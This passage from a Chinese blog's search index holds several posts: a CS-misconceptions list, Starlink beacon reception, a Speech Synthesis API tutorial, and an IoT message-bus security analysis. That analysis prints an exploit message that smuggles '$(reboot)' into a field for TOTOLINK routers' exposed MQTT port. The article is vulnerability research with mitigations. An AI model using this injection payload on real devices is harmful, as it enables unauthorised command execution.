如果一个软件可以运行在我的笔记本电脑上，就可以运行在其他人的笔记本电脑上。 9、 StackOverflow 问答社区的答案都是可信的。 10、 如果一段代码出现到互联网上，就意味着你可以使用它。 11、 开源软件意味着更少的错误并且更加安全。 12、 开源软件（open software）和自由软件（free software）是同义词。 13、 git 和 GitHub 是同义词。 14、 Unix 和 Linux 是同义词。 15、 bash 和 sh 是同义词。 16、 AWS 和\"云服务\"是同义词。 17、 “隐私\"和\"秘密\"是同义词。 18、 “加密\"和\"安全\"是同义词。 19、 聪明的程序员会写出聪明的代码。 20、 编程能力是一名优秀软件工程师的最重要品质。 21、 拥有 CS 学位是成为一名优秀软件工程师的必要和充分条件。 22、 计算机解析时间和日期是轻而易举的。 23、 CS 毕业生知道如何验证电子邮件地址。 24、 雇主关心 CS 学生选修了哪些课程。 25、 分布式网络是可靠的。 26、 第三方服务是可靠的。 27、 AWS 云服务是可靠的。 28、 你可以将整个文件读入内存。 29、 在fork命令之后，父进程始终先执行。 30、 删除文件需要对该文件具有写权限。 31、 线程竞争很少发生。 32、 面向对象编程是最好和最常见的编程范式。 33、 CS 毕业生不会被黑客钓鱼，因为他们了解计算机。 34、 CS 毕业生了解计算机。 35、 CS 毕业生已经学过大多数的重要课程。 36、 电子表格和 Powerpoint 只适用于商业活动。 37、 程序员大部分时间都花在编程上。 38、 计算机可以按照指令进行操作。 39、 技术和算法是中立的。 40、 学习人文学科是浪费时间。 41、 你的职业生涯需要使用大量数学。 42、 如果谷歌使用它，那么别的公司也应该使用它。 43、 如果一种技术很先进，就应该使用它。 44、 如果一种技术超过5年，就不是新技术。 45、 只为了能够用上红黑树或某个高级算法，重写代码是值得的。 46、 大学毕业后，你还有机会遇到霍夫曼编码。 47、 具有 CS 学位的两个人，将具有非常相似的背景和知识。 48、 算法复杂性和大 O 表示法在现实世界中一直使用。 49、 学术界某种程度上跟现实世界不一样。 50、 没有人会输入这种数据，或者这样写代码。 （完） 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-05","objectID":"/zh-cn/%E5%85%B3%E4%BA%8E%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E7%9A%8450%E4%B8%AA%E8%AF%AF%E8%A7%A3/:0:0","tags":["计算机科学"],"title":"关于计算机科学的50个误解","uri":"/zh-cn/%E5%85%B3%E4%BA%8E%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E7%9A%8450%E4%B8%AA%E8%AF%AF%E8%A7%A3/"},{"categories":["宇宙太空 卫星 通讯"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 接收带有RTL-SDR和LNB的STARLINK信标 Derek OK9SGC最近发布了一篇关于他们如何从SpaceX自2015年起持续发射的通信卫星Starlink星座接收Ku波段信标信号的文章。虽然我们最近报道了用HackRF超级集群捕获的Starlink信标，但德里克指出，接收信标只需要一个LNB，一个低成本的SDR，如RTL-SDR V3和一个向LNB提供12V直流电的动力喷射器。德里克指出，当信标以高功率传输时，甚至不需要盘子。 Starlink信标接收器设置 由于地球轨道低，因此Starlink星座的旅行速度很快，您将注意到您收到的信号中存在强烈的多普勒效应漂移。德里克指出，使用无线电观测（strf）软件的卫星跟踪工具包对卫星进行多普勒分析可能很有趣。他还指出，在他接收的30分钟内，几乎没有时间点没有收到信标，这表明Starlink星座接近100%的天空覆盖。 德里克让这个过程易于理解，并说明了听这些信标信号是多么容易。当然，我们注意到这些只是信标，它们不包含数据。它们仍然是接收的有趣信号，多普勒分析可以揭示有关轨道的有趣信息。 星链信标显示在快速FFT（左）和慢FTF（右）中 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-05","objectID":"/zh-cn/5-3/:0:0","tags":["宇宙太空 卫星 通讯"],"title":"接收带有RTL-SDR和LNB的STARLINK信标","uri":"/zh-cn/5-3/"},{"categories":["宇宙太空 卫星 通讯"],"content":"此文为加密收费内容添加我微信支付后可看: $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # [包含八个黑客RF的SDR超级集群的技术细节](https://ybrc.github.io/zh-cn/5-2/) 几周前，我们发布了关于Reddit成员u/OlegKutkov的信息，他使用他的HackRF超级集群接收Starlink信标，但关于HackRF超级集群项目本身的细节有点稀少。现在，Oleg发布了关于HackRF超级集群的完整描述，指出系统中的8个HackRF可以提供高达160兆赫的实时监控带宽。 Oleg展示了每个板子如何连接到同一GPS纪律严明的10兆赫时钟源，它如何将射频拆分器与LNA一起使用，以及它如何需要8个独立的主机控制器连接到计算机系统中的单个PCIe线路，以克服USB2.0数据带宽限制。他还展示了他创建的GNU Radio脚本，该脚本将8个来源合二为一。 Oleg写道，他如何使用HackRF超级集群以及电视Ku-Band LNB和卫星天线进行宽带卫星监控。 HackRF超集群块图 HackRF超级集群 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-05","objectID":"/zh-cn/5-2/:0:0","tags":["宇宙太空 卫星 通讯"],"title":"包含八个黑客RF的SDR超级集群的技术细节","uri":"/zh-cn/5-2/"},{"categories":["JavaScript API"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # JS中的语音合成——Speech Synthesis API ","date":"2021-12-05","objectID":"/zh-cn/5-1/:0:0","tags":["JavaScript API"],"title":"JS中的语音合成——Speech Synthesis API","uri":"/zh-cn/5-1/"},{"categories":["JavaScript API"],"content":"简介 HTML5中和Web Speech相关的API实际上有两类，一类是“语音识别(Speech Recognition)”，另外一个就是“语音合成(Speech Synthesis)”， 这两个名词实际上指的分别是“语音转文字”，和“文字变语音”。 ","date":"2021-12-05","objectID":"/zh-cn/5-1/:1:0","tags":["JavaScript API"],"title":"JS中的语音合成——Speech Synthesis API","uri":"/zh-cn/5-1/"},{"categories":["JavaScript API"],"content":"Speech Synthesis API是一个很棒的API，非常适合尝试新型界面并让浏览器与您对话 语音合成API是现代浏览器提供的强大工具。 2014年推出，现在被广泛采用并在Chrome，Firefox，Safari和Edge中可用。不支持IE。 本文介绍的是语音合成(Speech Synthesis)，语音识别(Speech Recognition)请移步另一篇。 想要浏览器开口说话，只需要： 使用语音合成API停留在一条线上： let speechInstance = new SpeechSynthesisUtterance('Mr·Yang'); speechSynthesis.speak(speechInstance); var ssu={init:function(){ssu.speech(window.getSelection().toString())},speech:function(e){e\u0026\u0026\"\"!=e.trim()||(e=\"为你翘课的那一天花落的那一天教室的那一间我怎么看不见消失的下雨天我好想再淋一遍没想到 失去的勇气我还留着好想再问一遍你会等待还是离开\");var s=new window.SpeechSynthesisUtterance(e);window.speechSynthesis.speak(s)}};ssu.init(); 将其复制并粘贴到您的浏览器控制台中，您的计算机就会讲话！ ","date":"2021-12-05","objectID":"/zh-cn/5-1/:2:0","tags":["JavaScript API"],"title":"JS中的语音合成——Speech Synthesis API","uri":"/zh-cn/5-1/"},{"categories":["JavaScript API"],"content":"API 该API将多个对象公开给window目的。 ","date":"2021-12-05","objectID":"/zh-cn/5-1/:3:0","tags":["JavaScript API"],"title":"JS中的语音合成——Speech Synthesis API","uri":"/zh-cn/5-1/"},{"categories":["JavaScript API"],"content":"SpeechSynthesisUtterance SpeechSynthesisUtterance代表语音请求。在上面的示例中，我们为它传递了一个字符串。那是浏览器应大声朗读的消息。 获得语音对象后，您可以进行一些调整以编辑语音属性： const utterance = new SpeechSynthesisUtterance('Hey') utterance.rate：设置速度，可接受[0.1-10]，默认为1 utterance.pitch：设置音高，接受[0-2]，默认为1 utterance.volume：设置音量，接受[0-1]，默认为1 utterance.lang：设置语言（值使用BCP 47语言标记，例如en-US或者it-IT） utterance.text：您可以将其作为属性传递，而不是在构造函数中进行设置。文字最多32767个字符 utterance.voice：设置声音（有关此内容，请参见下文） 例子： const utterance = new SpeechSynthesisUtterance('Hey') utterance.pitch = 1.5 utterance.volume = 0.5 utterance.rate = 8 speechSynthesis.speak(utterance) ","date":"2021-12-05","objectID":"/zh-cn/5-1/:3:1","tags":["JavaScript API"],"title":"JS中的语音合成——Speech Synthesis API","uri":"/zh-cn/5-1/"},{"categories":["JavaScript API"],"content":"设定声音 浏览器具有不同数量的可用声音。 要查看列表，请使用以下代码： console.log(`Voices #: ${speechSynthesis.getVoices().length}`) speechSynthesis.getVoices().forEach(voice =\u003e { console.log(voice.name, voice.lang) }) 这是跨浏览器问题之一。上面的代码在Firefox，Safari（可能还有Edge，但我没有对其进行测试）中都可以使用，但是在Chrome中不起作用。 Chrome需要以不同的方式处理声音，并且需要在加载声音后调用回调： const voiceschanged = () =\u003e { console.log(`Voices #: ${speechSynthesis.getVoices().length}`) speechSynthesis.getVoices().forEach(voice =\u003e { console.log(voice.name, voice.lang) }) } speechSynthesis.onvoiceschanged = voiceschanged 调用回调后，我们可以使用speechSynthesis.getVoices()。 我认为这是因为Chrome（如果存在网络连接）会检查Google服务器中的其他语言： 如果没有网络连接，则可用的语言数量与Firefox和Safari相同。在启用了网络的情况下，还可以使用其他语言，但是API也可以脱机工作。 ","date":"2021-12-05","objectID":"/zh-cn/5-1/:4:0","tags":["JavaScript API"],"title":"JS中的语音合成——Speech Synthesis API","uri":"/zh-cn/5-1/"},{"categories":["JavaScript API"],"content":"跨浏览器实现以获取语言 由于存在这种差异，因此我们需要一种将其抽象化以使用API的方法。这个例子做了这个抽象： const getVoices = () =\u003e { return new Promise(resolve =\u003e { let voices = speechSynthesis.getVoices() if (voices.length) { resolve(voices) return } speechSynthesis.onvoiceschanged = () =\u003e { voices = speechSynthesis.getVoices() resolve(voices) } }) } const printVoicesList = async () =\u003e { ;(await getVoices()).forEach(voice =\u003e { console.log(voice.name, voice.lang) }) } printVoicesList() 见小故障 ","date":"2021-12-05","objectID":"/zh-cn/5-1/:5:0","tags":["JavaScript API"],"title":"JS中的语音合成——Speech Synthesis API","uri":"/zh-cn/5-1/"},{"categories":["JavaScript API"],"content":"使用自定义语言 默认声音是英语。 您可以通过设置话语来使用所需的任何语言lang财产： let utterance = new SpeechSynthesisUtterance('Ciao') utterance.lang = 'it-IT' speechSynthesis.speak(utterance) ","date":"2021-12-05","objectID":"/zh-cn/5-1/:6:0","tags":["JavaScript API"],"title":"JS中的语音合成——Speech Synthesis API","uri":"/zh-cn/5-1/"},{"categories":["JavaScript API"],"content":"使用其他声音 如果有一个以上的声音可用，则可能要选择另一个声音。例如，默认的意大利语声音是女性，但也许我想要男性声音。这是我们从声音列表中获得的第二个声音。 const lang = 'it-IT' const voiceIndex = 1 const speak = async text =\u003e { if (!speechSynthesis) { return } const message = new SpeechSynthesisUtterance(text) message.voice = await chooseVoice() speechSynthesis.speak(message) } const getVoices = () =\u003e { return new Promise(resolve =\u003e { let voices = speechSynthesis.getVoices() if (voices.length) { resolve(voices) return } speechSynthesis.onvoiceschanged = () =\u003e { voices = speechSynthesis.getVoices() resolve(voices) } }) } const chooseVoice = async () =\u003e { const voices = (await getVoices()).filter(voice =\u003e voice.lang == lang) return new Promise(resolve =\u003e { resolve(voices[voiceIndex]) }) } speak(‘Ciao’) 见小故障 ","date":"2021-12-05","objectID":"/zh-cn/5-1/:7:0","tags":["JavaScript API"],"title":"JS中的语音合成——Speech Synthesis API","uri":"/zh-cn/5-1/"},{"categories":["JavaScript API"],"content":"语言的价值 这些是您可以使用的语言的一些示例： 阿拉伯语（沙特阿拉伯）➡️ar-SA 中文（中国）➡️zh-CN 中文（中国香港特别行政区）➡️zh-HK 中文（台湾）➡️zh-TW 捷克（捷克共和国）➡️cs-CZ 丹麦文（丹麦）➡️da-DK 荷兰语（比利时）➡️nl-BE 荷兰语（荷兰）➡️nl-NL 英语（澳大利亚）➡️en-AU 英语（爱尔兰）➡️en-IE 英语（南非）➡️en-ZA 英文（英国）➡️en-GB 英文（美国）➡️en-US 芬兰文（芬兰）➡️fi-FI 法语（加拿大）➡️fr-CA 法语（法国）➡️fr-FR 德语（德国）➡️de-DE 希腊文（希腊）➡️el-GR 印地语（印度）➡️hi-IN 匈牙利文（匈牙利）➡️hu-HU 印尼文（印度尼西亚）➡️id-ID 意大利语（意大利）➡️it-IT 日语（日本）➡️ja-JP 韩文（南韩）➡️ko-KR 挪威文（挪威）➡️no-NO 波兰文（波兰）➡️pl-PL 葡萄牙语（巴西）➡️pt-BR 葡萄牙语（葡萄牙）➡️pt-PT 罗马尼亚语（罗马尼亚）➡️ro-RO 俄语（俄罗斯）➡️ru-RU 斯洛伐克（斯洛伐克）➡️sk-SK 西班牙语（墨西哥）➡️es-MX 西班牙文（西班牙）➡️es-ES 瑞典语（瑞典）➡️sv-SE 泰国（泰国）➡️th-TH 土耳其语（土耳其）➡️tr-TR ","date":"2021-12-05","objectID":"/zh-cn/5-1/:8:0","tags":["JavaScript API"],"title":"JS中的语音合成——Speech Synthesis API","uri":"/zh-cn/5-1/"},{"categories":["JavaScript API"],"content":"移动的 在iOS上，该API可以运行，但必须由用户操作回调（例如对轻击事件的响应）触发，以为用户提供更好的体验并避免手机发出意外声音。 您无法在台式机上喜欢，在台式机上，您的网页可以使您的文字突如其来。 免费下载我的JavaScript初学者手册 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-05","objectID":"/zh-cn/5-1/:9:0","tags":["JavaScript API"],"title":"JS中的语音合成——Speech Synthesis API","uri":"/zh-cn/5-1/"},{"categories":["物联网"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 物联网设备消息总线机制的使用及安全问题 本文对物联网设备中常用的两种消息总线机制——MQTT协议及ubus系统 进行介绍，并用两个真实设备（totolink路由器、2021强网杯小米路由器）的漏洞介绍它们的安全问题。 0x00 引言 提到总线（BUS），我们通常会想到和计算机硬件相关的总线机制，如数据总线、地址总线、控制总线和汽车用到的CAN总线等。但是，由于总线机制松耦合的特性，其越来越多的被物联网设备开发者应用于操作系统软件中，用来处理进程间或者设备间事件、消息的分发和处理。 物联网设备中的消息总线机制可以非常方便地实现设备间/进程间通信。在消息总线模型中，通常包含三种角色： 总线服务端，用来实现消息的分发，并接收客户端的消息订阅与注册（如下文将提到的ubusd以及MQTT代理）。 消息接收端，向总线服务端订阅/注册自己感兴趣的消息主题/对象，等待总线服务器发来的消息，并调用回调函数进行处理。 消息发送端，向总线服务端发送消息，发送时携带消息的主题或者对象及方法，告诉服务端将消息转发给谁。 然而，由于消息总线机制在一定程度上将数据的接收端和发送端解耦合，因此对于数据的接收端来说，通常情况下很难确认发送端的真实身份。攻击者可模拟消息发送端，通过总线服务端向消息接收端发送恶意消息，以触发接收端的消息解析漏洞。 物联网设备中常见的消息总线机制有MQTT协议以及ubus系统。其中MQTT作为一种应用层协议，不仅可以实现设备和应用（如APP、Web管理系统）之间远程通信，也可以将MQTT代理开放在设备内部实现进程间通信；类似Linux中的DBus机制，ubus系统是OpenWrt系统当中一个重要的进程间通信的方式，系统中很多应用都使用到了ubus，如涉及到网络管理的/sbin/netifd以及系统配置程序uci等等，ubus也提供了开源API供设备开发者调用。下文将对这两种机制进行介绍，并用两个真实设备（totolink路由器、2021强网杯小米路由器）的漏洞介绍它们的安全问题。 0x01 MQTT协议 MQTT协议是一种轻量级的物联网协议，该协议的特点是简单、开放、可扩展性强且易于实现，这些特点使它的应用场景非常广泛，涵盖了智慧生活、智慧城市、工业物联网、移动应用等领域。MQTT的安全问题从2015年起逐渐受到关注，主要目光集中在互联网中大量存在的缺少用户身份认证和授权的MQTT服务器，这些服务器导致了敏感信息被泄露，也允许攻击者向客户端设备越权发布消息，实现对设备的操控。关于MQTT协议安全性的研究工作有很多，其中趋势科技于2018年发布了一篇报告，揭示了MQTT和CoAP这两种物联网常见协议在实现时的脆弱性；我国西安电子科大的研究人员于2020年在国际网络安全顶会IEEE S\u0026P也发表了题目为Burglars’ IoT paradise: Understanding and mitigating security risks of general messaging protocols on IoT clouds的一篇文章，介绍了流行的物联网云平台在实现MQTT协议时存在的安全问题。这些工作都对理解MQTT协议的安全问题有很大帮助。 同时，在IoT设备中，也可能存在MQTT服务器。由于MQTT的总线特性并且非常易于实现，部分设备开发者非常喜欢使用内嵌在设备中的MQTT服务来实现进程间通信或者设备间通信，但这也在一定程度上带来了一些安全隐患。 ","date":"2021-12-04","objectID":"/zh-cn/5/:0:0","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"1. MQTT实现原理 不同于HTTP等请求/响应模型的协议，MQTT协议基于订阅/发布模型。在该模型中，有三种重要的角色： MQTT代理。也称MQTT服务器，负责处理消息的订阅和转发。 消息订阅者。负责订阅自己感兴趣的消息，接收从MQTT代理转发而来的消息并处理。 消息发布者。负责向订阅者发布消息，消息需先发布至MQTT代理，并由代理转发至订阅者。 可以看出，MQTT协议的订阅/发布模型具有总线的特点，所有数据并不直接发送至接收端，而是先发送至一个总线服务器（MQTT代理），由总线服务器负责消息的转发。MQTT消息通过主题（topic）进行标识，订阅者通过topic订阅自己感兴趣的消息，发布者在发布消息时，需携带对应的topic字段。MQTT代理在收到消息之后，会根据topic将消息转发至所有订阅该topic的订阅者，完成消息的转发。 MQTT协议支持使用多种身份认证方式，其中使用最为广泛的是用户名/密码认证以及客户端证书认证。但是，许多MQTT代理软件在默认情况下是不配置任何身份认证方式的，需要用户自行配置。如果用户忽略了这一步，就将导致上文提到的敏感信息泄露和越权发布消息的问题。大多数内嵌在设备内部的MQTT代理都缺乏身份认证机制，这是因为开发者在开发设备时考虑到内嵌的代理服务器并不会暴露在互联网中，而仅用作进程间或内网设备间通信，因此便不配置复杂的身份认证和授权机制。若消息订阅端存在消息解析漏洞，那么攻击者就可以伪造消息发布端的身份，向订阅端发布恶意消息，从而触发漏洞。下面将以totolink路由器MQTT命令注入漏洞为例，介绍内嵌MQTT服务的安全问题。 ","date":"2021-12-04","objectID":"/zh-cn/5/:1:0","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"2. totolink路由器MQTT消息解析漏洞（CNVD-2020-28090，CNVD-2020-28089） totolink A950RG和T10等型号路由器在处理HTTP数据时，会将HTTP数据通过内嵌的MQTT代理转发至对应的handler进行处理。而处理这些数据的handler在解析消息时存在多个漏洞，如setDiagnosisCfg的handler在解析诊断数据时，会将JSON格式消息的ipDomain对应的value拼接在ping命令中，并调用system函数执行ping命令。攻击者可以在ipDomain键值中注入恶意命令，实现远程命令注入。 若想通过Web接口触发此漏洞，需要先绕过Web认证方可实现。然而，由于设备对外开放了MQTT服务的1883端口，攻击者可以从外部直接向1883端口发布MQTT消息，从而绕过Web端的流程，实现命令注入。一个可行的exp消息如下所示： { \"topicurl\":\"setting/setDiagnosisCfg\", \"actionFlag\":\"1\", \"ipDoamin\":\"www.bai$(reboot)du.com\" } ","date":"2021-12-04","objectID":"/zh-cn/5/:2:0","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"3. 思考 内嵌在设备内部的MQTT服务为攻击者打开了新的大门，使攻击者无需绕过Web认证，亦可触发到后端处理HTTP数据时的命令注入漏洞。在上述案例中，内嵌的MQTT服务原本仅用来实现进程间通信，对于消息的订阅端程序（cste_sub）来说，它只想接收来自Web cgi发布而来的消息。但是由于MQTT的服务端口（TCP 1883）对外开放（监听在0.0.0.0），导致任何能够访问到设备的用户均可访问这个内嵌的MQTT服务。开发者可以将该端口监听在127.0.0.1，便可保证外部无法访问。 进一步可以思考，若开放在云端的MQTT服务器缺少身份认证和授权机制，可能也可以导致订阅端设备在不开放任何端口（或隐藏在NAT下）的前提下受到远程攻击，危害极大。作为一种消息总线类型的协议，MQTT将消息的订阅者和发布者在一定程度上解耦合，只有在MQTT代理配置了健全的身份认证和授权机制的前提下，才能保证数据的收发两端紧密绑定，防止第三方攻击者越权发布恶意消息。 0x02 ubus机制 ubus全称为OpenWrt micro bus architecture，是OpenWrt系统中提供的一种进程间通信机制，该机制包括一个服务端程序（ubusd），一个命令行客户端（ubus）以及提供了API接口的动态链接库（libubus）。ubus的核心是ubusd，该程序位于/sbin目录，负责接收其它ubus客户端的注册，并处理消息分发。ubus通信使用了Unix sockets，消息数据使用了TLV（type-length-value）格式，由ubox（libubox）提供，下文详述。ubus的源码可从 https://git.openwrt.org/project/libubus.git 获得。 开发者可以调用libubus.so提供的API开发客户端程序，进行注册、消息发送和接收。ubus的客户端有两种角色：一种为消息的接收端（本文称为receiver），另一种为消息发送端（本文称为sender）。 每个receiver可以向ubusd注册一个或多个path，并为每个path提供消息处理的方法。sender负责发送消息至ubusd，发送时携带path信息，告诉ubusd将该消息转发到哪个receiver的哪个path。 receiver注册时使用的path，包括对象（object）和方法（method）的概念。一个object中可以包括多个method，对应多个处理函数。object和method都有自己的名字，在注册时需要提供，同时在receiver程序内部也有所体现。 ","date":"2021-12-04","objectID":"/zh-cn/5/:3:0","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"1. ubus实现原理 ubus的实现可参考以下几篇博客： [openwrt] 使用ubus实现进程通信 [openwrt] ubus实现进程间通信举例 引用上述博客的例子： 如上图所示，sender通过ubus命令请求在ubusd侧注册的“interface”对象的“setlanip”方法，试图修改ip地址。对应的处理函数（func2）在receiver程序中定义，并由receiver程序在启动后向ubusd注册。整个请求过程如下： receiver向ubusd注册两个object：“interface”和“dotalk”，其中“interface”对象注册了两个method：“getlanip”和“setlanip”，对应的处理函数分别为func1()和func2()。“dotalk”对象中注册了两个method：“sayhi”和“saybye”，对应的处理函数分别为func3()和func4()。 sender试图与receiver通信，它们之间不能直接通信，需要经过ubusd中转消息。sender可以用shell/lua/C来实现。这里sender直接调用了ubus call命令发送消息，ubus程序的命令如下： root@XiaoQiang:~# ubus Usage: ubus [\u003coptions\u003e] \u003ccommand\u003e [arguments...] Options: -s \u003csocket\u003e: Set the unix domain socket to connect to -t \u003ctimeout\u003e: Set the timeout (in seconds) for a command to complete -S: Use simplified output (for scripts) -v: More verbose output Commands: - list [\u003cpath\u003e] List objects - call \u003cpath\u003e \u003cmethod\u003e [\u003cmessage\u003e] Call an object method - listen [\u003cpath\u003e...] Listen for events - send \u003ctype\u003e [\u003cmessage\u003e] Send an event - wait_for \u003cobject\u003e [\u003cobject\u003e...] Wait for multiple objects to appear on ubus ubusd接收到请求消息之后，根据object名找到对应的处理程序receiver，然后将消息发送到receiver。 receiver收到消息后，根据object和method定位到消息处理函数func2()，并处理消息。如果处理完消息需要回复，则发送响应消息。 ","date":"2021-12-04","objectID":"/zh-cn/5/:4:0","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"2. ubus消息数据格式 ubus消息数据使用了libubox中的blob模块。libubox是OpenWrt中的一个基础库，提供了很多基础功能，其源码可从 http://git.openwrt.org/project/libubox.git 获得，其中ubus主要使用到的有事件监控模块uloop以及二进制数据处理模块blob/blobmsg。blob全称为Binary large object，负责处理二进制数据。其数据结构详解可以参考如下文章： [libubox 3] - BLOB BLOGMSG blob_buf，blobmsg内存图详解 ","date":"2021-12-04","objectID":"/zh-cn/5/:5:0","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"blob blob基于TLV格式，即type-length-value格式，这可以从blob中最基本的数据类型blob_attr的结构看出： struct blob_attr { uint32_t id_len; // 32位，其中高8位为id，低24位为len char data[]; // 二进制数据内容 } __packed; 该结构的id_len为type+length，其中高8位为id，即type，低24位为length，即二进制数据的长度。8位id的最高位为extend标志，表示blob类型（0）或者blobmsg类型（1），后7位为type，即数据的类型。每个blob_attr表示一个二进制数据，当传输多个blob数据时，多个blob_attr可以通过数组+嵌套的方式保存在一起，由blob_buf结构表示。如下图所示： 其中blob_buf结构体如下： struct blob_buf { struct blob_attr *head; // 没完全搞清楚，可能是指向当前最外层的blob_attr bool (*grow)(struct blob_buf *buf, int minlen); //扩大buf的方法 int buflen; // buf的总长度 void *buf; // 指向buf头，即最外层blob_attr起始位置 }; ubus在使用blob时，会将ubus的消息类型（属性）传递给blob，记录在blob_attr-\u003eid_len的高8位，作为blob数据类型。ubus消息属性有以下15种： enum ubus_msg_attr { UBUS_ATTR_UNSPEC, UBUS_ATTR_STATUS, UBUS_ATTR_OBJPATH, UBUS_ATTR_OBJID, UBUS_ATTR_METHOD, UBUS_ATTR_OBJTYPE, UBUS_ATTR_SIGNATURE, UBUS_ATTR_DATA, UBUS_ATTR_TARGET, UBUS_ATTR_ACTIVE, UBUS_ATTR_NO_REPLY, UBUS_ATTR_SUBSCRIBERS, UBUS_ATTR_USER, UBUS_ATTR_GROUP, /* must be last */ UBUS_ATTR_MAX, }; ","date":"2021-12-04","objectID":"/zh-cn/5/:5:1","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"blobmsg blobmsg数据称为blob消息对象，包裹在blob_attr中的data部分，即为blob TLV的value。格式为name-value，即每个消息数据都有一个对应的name字符串，放在blobmsg_hdr结构体中： struct blobmsg_hdr { uint16_t namelen; / / 两个字节,name字符串长度 uint8_t name[]; // name字符串，表示消息的名字 } __packed; blobmsg数据在发送时是包含在blob_attr中的，格式如下图所示： blobmsg消息类型共有13种，如下所示: enum blobmsg_type { BLOBMSG_TYPE_UNSPEC, BLOBMSG_TYPE_ARRAY, BLOBMSG_TYPE_TABLE, BLOBMSG_TYPE_STRING, BLOBMSG_TYPE_INT64, BLOBMSG_TYPE_INT32, BLOBMSG_TYPE_INT16, BLOBMSG_TYPE_INT8, BLOBMSG_TYPE_BOOL = BLOBMSG_TYPE_INT8, BLOBMSG_TYPE_DOUBLE, __BLOBMSG_TYPE_LAST, BLOBMSG_TYPE_LAST = __BLOBMSG_TYPE_LAST - 1, BLOBMSG_CAST_INT64 = __BLOBMSG_TYPE_LAST, }; 消息类型被记录在blob_attr的id_len的高8位中，对于blobmsg数据，其中最高位extend值为1，表示blob的扩展数据类型。 ","date":"2021-12-04","objectID":"/zh-cn/5/:5:2","tags":["物联网"],"title":"物联网设备消息总线机制的使用及安全问题","uri":"/zh-cn/5/"},{"categories":["物联网"],"content":"blob数据生成 blob消息的生成有以下几个步骤： blob_buf_init函数初始化blob_buf，该函数原型如下： int blob_buf_init(struct blob_buf *buf, int id) 使用blob_put_xxx系列函数，向blob_buf中加入blob_attr数据。常用的blob_put_xxx系列函数如下： static inline struct blob_attr * blob_put_string(struct blob_buf *buf, int id, const char *str) static inline struct blob_attr * blob_put_u8(struct blob_buf *buf, int id, uint8_t val) static inline struct blob_attr * blob_put_u16(struct blob_buf *buf, int id, uint16_t val) static inline struct blob_attr * blob_put_u32(struct blob_buf *buf, int id, uint32_t val) static inline struct blob_attr * blob_put_u64(struct blob_buf *buf, int id, uint64_t val) #define blob_put_int8 blob_put_u8 #define 